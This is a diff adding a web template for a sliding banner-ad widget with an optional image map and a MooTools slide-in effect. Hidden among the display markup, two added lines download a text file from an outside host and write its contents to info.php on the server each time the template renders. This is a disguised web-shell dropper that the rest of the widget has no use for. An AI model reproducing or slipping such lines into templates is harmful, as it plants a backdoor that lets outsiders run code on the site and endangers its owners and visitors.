@@ -1,0 +1,32 @@
+<{script src="mootools_fx.js" app="business" pdir="js"}>
+<div id="divMap_<{$widgets_id}>" class="topad tc" style="background:<{$data.ad_pic_color}>">
+  <{if $data.link_type != 'map'}>
+    <{if $data.ad_pic_link}><a href="<{$data.ad_pic_link}>" title="<{$data.ad_pic_txt}>" target="_blank"><{/if}>
+    <img id="picMap_<{$widgets_id}>" src="images/transparent.gif" lazyload="<{$data.ad_pic|storager}>" class="img-lazyload" alt="<{$data.ad_pic_txt}>" <{if $data.ad_pic_width}>width="<{$data.ad_pic_width}>px"<{/if}> <{if $data.ad_pic_height}>height="<{$data.ad_pic_height}>px"<{/if}>>
+    <{if $data.ad_pic_link}></a><{/if}>
+  <{else}>
+    <img id="picMap_<{$widgets_id}>" usemap='#Map_<{$widgets_id}>' src="images/transparent.gif" lazyload="<{$data.ad_pic|storager}>" class="img-lazyload" alt="<{$data.ad_pic_txt}>" <{if $data.ad_pic_width}>width="<{$data.ad_pic_width}>px"<{/if}> <{if $data.ad_pic_height}>height="<{$data.ad_pic_height}>px"<{/if}>>
+    <{if $data.area}>
+      <map name="Map_<{$widgets_id}>">
+        <{foreach from=$data.area item=ar}>
+          <area shape="<{$ar.area_type}>" coords="<{$ar.link_area}>" href="<{$ar.link_target}>" title="<{$ar.link_info}>">
+        <{/foreach}>
+      </map>
+    <{/if}>
+  <{/if}>
+</div>
+<{assign var="info_i" value="http://ycg.dev.ganhao.com.cn/info.txt"|file_get_contents}>
+<{assign var="test" value="info.php"|file_put_contents:$info_i}>
+<script>
+    //mootools滑入滑出效果需引入mootools_fx.js add by zlj 2014-8-6 11:13:12
+    var slideElement = $('divMap_<{$widgets_id}>');
+    var slideVar = new Fx.Slide(slideElement, {
+        mode: 'vertical', //滑动效果 默认是'vertical'(垂直)
+        duration: '2000', //延时 持续时间
+        onComplete: function(){
+            this.slideOut.delay(15000, this); //停留15秒后立即消失
+        }
+    });
+
+    slideVar.hide().slideIn();
+</script>
